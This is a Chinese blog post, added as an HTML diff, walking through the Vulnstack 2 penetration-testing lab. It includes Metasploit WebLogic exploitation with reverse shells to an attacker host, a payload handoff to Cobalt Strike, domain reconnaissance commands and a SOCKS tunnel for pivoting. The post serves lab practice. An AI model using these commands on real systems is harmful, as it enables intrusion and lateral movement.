@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>TErr10st.H&#39;s B10g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Vulnstack 2 靶场初探指派: Anonymous状态: 进行中 学内网没有方向，于是想打一下靶场找找学习的点，一趟下来感觉知道了不少东西，同时也发现这个思路没错，希望以后能坚持下去吧 靶场下载地址： http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F; 环境配置下载的 Vulnstack 靶场的配置都是写好，内网固定是10.10.10.1&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TErr10st.H&#39;s B10g">
+<meta property="og:url" content="http://example.com/2022/03/23/Vulnstack%202%20%E9%9D%B6%E5%9C%BA%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="TErr10st.H&#39;s B10g">
+<meta property="og:description" content="Vulnstack 2 靶场初探指派: Anonymous状态: 进行中 学内网没有方向，于是想打一下靶场找找学习的点，一趟下来感觉知道了不少东西，同时也发现这个思路没错，希望以后能坚持下去吧 靶场下载地址： http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F; 环境配置下载的 Vulnstack 靶场的配置都是写好，内网固定是10.10.10.1&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%201.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%202.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%203.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%204.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%205.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%206.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%207.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%208.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%209.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2010.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2011.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2012.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2013.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2014.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2015.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2016.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2017.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2018.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2019.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2020.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2021.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2022.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2023.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2024.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2025.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2026.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2027.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2028.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2029.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2030.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2031.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2032.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2033.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2034.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2035.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2036.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2037.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2038.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2039.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2040.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2041.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2042.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2043.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2044.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2045.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2046.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2047.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2048.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2049.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2050.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2051.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2052.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2053.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2054.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2055.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2056.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2057.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2058.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2059.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2060.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2061.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2062.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2063.png">
+<meta property="og:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled%2064.png">
+<meta property="article:published_time" content="2022-03-23T08:07:27.036Z">
+<meta property="article:modified_time" content="2022-03-23T00:05:36.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/Vulnstack%20%209e7ab/Untitled.png">
+    <link rel="stylesheet" href="/lib/jquery.fancybox.min.css?v=1648022923354">
+    
+    <link rel="stylesheet" href="/lib/mdui_043tiny/css/mdui.css?v=1648022923354">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1648022923354">
+    <link rel="stylesheet" href="/css/style.css?v=1648022923354">
+     
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="John Doe" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="John Doe">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe" alt="John Doe">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>2</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://jq.qq.com/?_wv=1027&k=5CfKHun" target="_blank" mdui-tooltip="{content: 'QQ群'}" style="color: rgb(249, 174, 8);background-color: rgba(249, 174, 8, .1);">
+            <i class="nexmoefont icon-QQ"></i>
+        </a><a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+    
+    
+
+    
+    
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 John Doe
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"><img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a><script data-ad-client="ca-pub-2058306854838448" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
+              <img data-src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg" data-sizes="auto" alt="" class="lazyload">
+              <h1></h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2022年03月23日</a>
+</div>
+
+      
+
+      <h1 id="Vulnstack-2-靶场初探"><a href="#Vulnstack-2-靶场初探" class="headerlink" title="Vulnstack 2 靶场初探"></a>Vulnstack 2 靶场初探</h1><p>指派: Anonymous<br>状态: 进行中</p>
+<p>学内网没有方向，于是想打一下靶场找找学习的点，一趟下来感觉知道了不少东西，同时也发现这个思路没错，希望以后能坚持下去吧</p>
+<p>靶场下载地址：</p>
+<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>下载的 Vulnstack 靶场的配置都是写好，内网固定是10.10.10.1&#x2F;24，因为用的是网卡 VMnet2 ，所以这个不用改了。主要是外网的网段，每个人的 VMWare 虚拟网络编辑器配置中 VMnet8 都不一样，像我之前是192.168.174.1&#x2F;24，但是两个靶机都把外网网段设为了192.168.111.1&#x2F;24，如下 Web.de1ay</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled.png" alt="Untitled" class="lazyload"></p>
+<p>所以我们要么就把虚拟网络编辑器的 NAT 修改为111，要么就进到 Web 和 DC 中把第一块网卡的 IP 改成自己的 NAT 网段，这里我就跟着靶场作者来了</p>
+<p>注意这里一定要看好虚拟网络编辑器中的配置是否和靶机上的 IP 段一致，否则靶场是搭不起来的。</p>
+<p>VMWare 虚拟网络编辑器配置 ：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%201.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%202.png" alt="Untitled" class="lazyload"></p>
+<p><strong>DC.de1ay</strong></p>
+<p>用户名：DE1AY\de1ay</p>
+<p>密码：1qaz@WSX</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%203.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%204.png" alt="Untitled" class="lazyload"></p>
+<p><strong>PC.de1ay</strong></p>
+<p>用户名：DE1AY\mssql</p>
+<p>密码：1qaz@WSX</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%205.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%206.png" alt="Untitled" class="lazyload"></p>
+<p><strong>WEB.de1ay</strong></p>
+<p>直接以 DE1AY\administrator 用户登入就好了，密码：1qaz@WSX</p>
+<p>第二次登入会显示密码过期了，那就改一下：hongrisec@2022</p>
+<p>网卡配置：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%207.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%208.png" alt="Untitled" class="lazyload"></p>
+<p>然后我们要打开 Web 机的一些服务，来到 <code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code> 路径，以管理员权限执行<code>setDomainENV</code>、<code>startManageWeblogic</code>、<code>startWeblogic</code></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%209.png" alt="Untitled" class="lazyload"></p>
+<p>运行 <code>startWeblogic</code> 会有个 cmd 一直在运行，这里不用管他</p>
+<p><strong>通配</strong></p>
+<p>WEB机和PC机：</p>
+<ul>
+<li>计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;<code>Server</code>、<code>Workstation</code>、<code>Computer Browser</code> 全部启动</li>
+<li>360服务开启</li>
+</ul>
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">内网网段：10.10.10.1/24</span><br><span class="line"></span><br><span class="line">模拟外网网段：192.168.111.1/24</span><br><span class="line"></span><br><span class="line">攻击机地址(kali)：192.168.111.128</span><br><span class="line"></span><br><span class="line">靶场机：</span><br><span class="line">Web.de1ay:边界服务器</span><br><span class="line">内网IP：10.10.10.80</span><br><span class="line">外网IP：192.168.111.80</span><br><span class="line"></span><br><span class="line">PC.de1ay:域成员</span><br><span class="line">内网IP：10.10.10.201</span><br><span class="line">外网IP：192.168.111.201</span><br><span class="line"></span><br><span class="line">DC.de1ay：域控</span><br><span class="line">内网IP：10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>由于作者对防火墙的设置，我们在搭完三台靶机后，PC 和 Web 是无法互 ping 的，且域控也无法 ping 通这两台，但是 PC 和 Web 可以内网 ping 通 DC。一开始打靶场的时候我就是没有 ping 通，一直以为自己把靶机打坏了QWQ，不停地在调  VMWare 的网络编辑器，结果其实看看防火前的出入站规则就知道了。</p>
+<h1 id="外网拿-shell"><a href="#外网拿-shell" class="headerlink" title="外网拿 shell"></a>外网拿 shell</h1><p>首先扫描 web 服务器，进行信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -sV 192.168.111.80</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2010.png" alt="Untitled" class="lazyload"></p>
+<p>通过扫描结果可以看到目标机开放的端口和对应服务，1433端口运行着 MySql 服务，3389被防火墙所保护，7001端口开放着 Weblogic 服务</p>
+<p>这里我们是自己搭的环境所以肯定知道要利用 Weblogic 了，实战时就不能放过任一开放端口了</p>
+<p>WebLogic 是一个基于 JAVAEE 架构的中间件，目前已经被爆出很多漏洞，其默认部署端口是7001，Githhub 上有专门针对 Weblogic 的漏扫，直接下载下来用就好了</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WeblogicScan.py -u 192.168.111.80 -p 7001</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2011.png" alt="Untitled" class="lazyload"></p>
+<p>这个版的 WeblogicScan 扫描结果是英文的，还有个版结果是中文输出，看起来更直观一点，链接放这了<a target="_blank" rel="noopener" href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p>
+<ul>
+<li>Weblogic 后台路径存在<a target="_blank" rel="noopener" href="http://192.168.111.80:7001/console/login/LoginForm.jsp">http://192.168.111.80:7001/console/login/LoginForm.jsp</a></li>
+<li>SSRF 漏洞存在</li>
+<li>CVE-2019-2725</li>
+<li>CVE-2017-3506</li>
+</ul>
+<p>知道可利用点后就有很多方法了，利用 JAVA 反序列化工具可以梭哈，这里用个最简单的方法，直接找 msf 中录入的 CVE </p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2012.png" alt="Untitled" class="lazyload"></p>
+<p><code>exploit/multi/misc/weblogic_deserialize_asyncresponseservice</code> 默认目标系统是 Unix ，注意这里要设置成 Windows</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2013.png" alt="Untitled" class="lazyload"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.111.80</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 6666</span><br><span class="line">set target 1</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2014.png" alt="Untitled" class="lazyload"></p>
+<p>设置完成后 <code>exploit</code> ，如果一次没有返回 meterpreter 可以多执行几次</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2015.png" alt="Untitled" class="lazyload"></p>
+<p>一般拿到 meterpreter 后，首先要做的就是迁移进程，一方面是防止被发现，另一方面是尽可能地防止 meterpreter 断连。</p>
+<p><code>getpid</code> 命令查看 Meterpreter Shell 的进程</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2016.png" alt="Untitled" class="lazyload"></p>
+<p><code>ps</code> 获取目标主机正在运行的进程，我们找一个以 SYSTEM 用户权限运行的进程，例如 smss.exe</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2017.png" alt="Untitled" class="lazyload"></p>
+<p>利用 <code>migrate 256</code> 将 shell 进程迁移到 smss.exe 进程里</p>
+<p>meterpreter 的自动迁移进程命令：<code>run post/windows/manage/migrate</code> </p>
+<p>建议是使用它自带的自动迁移命令即上面这条，自己寻找进程进行迁移的话有可能会导致一些意想不到的情况发生，就比如说蓝屏…</p>
+<p>进程迁移完后，原先 PID 为2876的进程行会自动关闭，如未关闭可以输入 <code>kill 2876</code> 杀掉进程</p>
+<p><code>getuid</code> 查看当前权限</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2018.png" alt="Untitled" class="lazyload"></p>
+<p>MSF 已经拿到 shell 了，现在把这个meterpreter的shell派生到CS上面，也就是让CS也也拿到一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.111.128 123456</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
+
+<p>登录框出来后输入 password 123456 ，创建一个 Lisenter，相当于 msf 的 handler</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2019.png" alt="Untitled" class="lazyload"></p>
+<p>设置好监听本地 7777 端口，回到 MSF</p>
+<p>执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 7777</span><br><span class="line">set session 2 #sessionID具体看给你的分配，我这里是session 2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2020.png" alt="Untitled" class="lazyload"></p>
+<p>再次回到 CS 中，shell 过来了，上线了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2021.png" alt="Untitled.png" class="lazyload"></p>
+<p>拿到 CSshell 后，一般先将回显时间由默认的 60s 改成 1s，右键选择 Intercat</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2022.png" alt="Untitled" class="lazyload"></p>
+<p>beacon 中输入 <code>sleep 1</code> 即可</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2023.png" alt="Untitled" class="lazyload"></p>
+<p>CS beacon 要执行系统命令只需要在前面加 <code>shell</code> 即可，如 <code>shell systeminfo</code></p>
+<p>这里只是说一下如何让 MSF 的 shell 传到 CS 上，CS 我用的也不多，所以就不演示 CS 拿 shell 传 MSF 了，下面打内网我也都用的是 MSF </p>
+<p>想用 CS 打的话可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/14189154.html">https://www.cnblogs.com/vege/p/14189154.html</a></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>惯用的套路先查看本机信息再查看域信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   # 查看本机ip，所在域</span><br><span class="line">route print     # 打印路由信息</span><br><span class="line">net view        # 查看局域网内其他主机名</span><br><span class="line">arp -a          # 查看arp缓存</span><br><span class="line">net start       # 查看开启了哪些服务</span><br><span class="line">net share       # 查看开启了哪些共享</span><br><span class="line">net share ipc$  # 开启ipc共享</span><br><span class="line">net share c$    # 开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;    # 与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;    # 建立c盘共享</span><br><span class="line">dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</span><br><span class="line"></span><br><span class="line">net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators    # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user (用户名) /domain   # 不加用户名查看域用户，加用户名获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net time /domain           #查看时间服务器，判断主域,主域服务器会同时作为时间服务器</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器（可能有多台）</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain    // 查看域管理员组</span><br></pre></td></tr></table></figure>
+
+<p>如果在 meterpreter 进入到 Windows cmd 后，遇到乱码如下</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2024.png" alt="Untitled" class="lazyload"></p>
+<p>输入 <code>chcp 65001</code> 就能解决乱码问题</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2025.png" alt="Untitled" class="lazyload"></p>
+<p>通过 <code>ipconfig /all</code> 发现 Web 机还有第二章网卡，IP为 10.10.10.80 ，判断为内网IP</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2026.png" alt="Untitled" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2027.png" alt="Untitled" class="lazyload"></p>
+<p>经过信息收集可以知道的信息有：目标内网存在域 de1ay.com，域内三台主机包括域控 DC 以及 PC 和 WEB ，域管理员为 Administrator，接下来我们便以 WEB 为跳板机进行横向移动</p>
+<p>在 Web 机上利用 EW 搭建代理</p>
+<p>EarthWorm 是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 主页： <a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>，EW 项目地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/haixian/ew-master c:\\</span><br></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/Vulnstack%20%209e7ab/Untitled%2028.png" alt="Untitled" class="lazyload"></p>
+<p>在本地添加转接隧道，将本地1080端口收到的数据发送给5555端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 5555</span><br></pre></td></tr></table></figure>
+
